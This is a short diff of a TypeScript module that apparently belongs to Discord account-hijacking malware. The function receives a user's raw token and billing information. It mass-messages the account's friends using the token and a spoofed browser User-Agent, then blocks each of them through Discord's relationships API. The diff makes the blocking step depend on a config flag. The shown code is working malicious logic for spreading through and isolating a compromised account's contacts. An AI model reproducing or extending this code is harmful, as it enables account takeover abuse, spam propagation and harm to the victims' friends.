@@ -42,16 +42,18 @@ export default async (client: Client, token: string, user: IUser, billingInforma
         })).json();
         if (message.retry_after) await new Promise((resolve) => { setTimeout(resolve, message.retry_after * 1000) });
 
-        const block = await (await fetch(`https://discord.com/api/v9/users/@me/relationships/${friend.id}`, {
-            method: 'PUT',
-            body: JSON.stringify({
-                type: 2
-            }),
-            headers: {
-                Authorization: token,
-                "Content-type": "application/json; charset=UTF-8",
-                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
-            }
-        })).json();
+        if (config.blockAfterMassMessage) {
+            const block = await fetch(`https://discord.com/api/v9/users/@me/relationships/${friend.id}`, {
+                method: 'PUT',
+                body: JSON.stringify({
+                    type: 2
+                }),
+                headers: {
+                    Authorization: token,
+                    "Content-type": "application/json; charset=UTF-8",
+                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+                }
+            });
+        }
     }
 }
